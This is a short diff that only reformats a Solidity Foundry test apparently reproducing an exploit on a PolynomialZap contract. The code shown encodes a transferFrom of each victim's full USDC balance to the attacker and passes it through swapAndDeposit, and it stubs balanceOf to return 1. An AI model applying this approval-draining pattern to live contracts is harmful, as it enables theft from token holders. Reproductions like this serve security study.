@@ -60,14 +60,18 @@ contract ContractTest is Test {
         );
     }
 
-    function executeSwapAndDeposit(address victim) internal {
+    function executeSwapAndDeposit(
+        address victim
+    ) internal {
         bytes memory data = encodeTransferData(victim);
         PolynomialZap zapContract = (victim == victims[0]) ? zap : zaps;
 
         zapContract.swapAndDeposit(victim, ETH_ADDRESS, address(this), address(USDC), address(this), 0, data);
     }
 
-    function encodeTransferData(address victim) internal view returns (bytes memory) {
+    function encodeTransferData(
+        address victim
+    ) internal view returns (bytes memory) {
         uint256 amount;
         if (victim == victims[0]) {
             amount = USDC.balanceOf(victim);
@@ -79,7 +83,9 @@ contract ContractTest is Test {
         return abi.encodeWithSelector(bytes4(0x23b872dd), victim, address(this), amount);
     }
 
-    function balanceOf(address account) public view returns (uint256) {
+    function balanceOf(
+        address account
+    ) public view returns (uint256) {
         return 1;
     }
 
